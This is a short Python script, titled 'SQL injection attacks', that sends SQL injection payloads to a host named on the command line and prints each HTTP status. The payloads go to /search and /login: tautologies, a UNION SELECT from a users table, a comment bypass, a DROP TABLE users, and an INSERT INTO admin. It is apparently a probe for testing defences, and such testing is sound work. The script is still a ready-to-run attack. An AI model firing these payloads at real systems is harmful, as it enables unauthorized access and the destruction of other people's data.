"""SQL injection attacks."""

import sys
import urllib.request
import urllib.parse
import urllib.error

TARGET = sys.argv[1] if len(sys.argv) > 1 else "localhost"
PORT = sys.argv[2] if len(sys.argv) > 2 else "80"
BASE = "http://{}:{}".format(TARGET, PORT)


def req(method, path, body=None, headers=None):
    url = BASE + path
    data = urllib.parse.urlencode(body).encode() if body else None
    hdrs = headers or {}
    hdrs.setdefault("User-Agent", "Mozilla/5.0 (X11; Linux x86_64)")
    r = urllib.request.Request(url, data=data, headers=hdrs, method=method)
    try:
        resp = urllib.request.urlopen(r, timeout=5)
        print("  {:4s} {:35s} -> {}".format(method, path, resp.status))
    except urllib.error.HTTPError as e:
        print("  {:4s} {:35s} -> {}".format(method, path, e.code))


print("\n── SQL injection ── target={}:{}\n".format(TARGET, PORT))

req("GET", '/search?q=1%27+OR+%271%27%3D%271')
req("GET", '/search?q=' + urllib.parse.quote("' UNION SELECT * FROM users--"))
req("GET", '/search?q=' + urllib.parse.quote("admin' --"))
req("GET", '/search?q=' + urllib.parse.quote("'; DROP TABLE users; --"))
req("POST", "/login", {"user": "'; INSERT INTO admin VALUES(1); --", "pass": "x"})
req("POST", "/login", {"user": "' OR '1'='1", "pass": ""})

print("\nDone.")
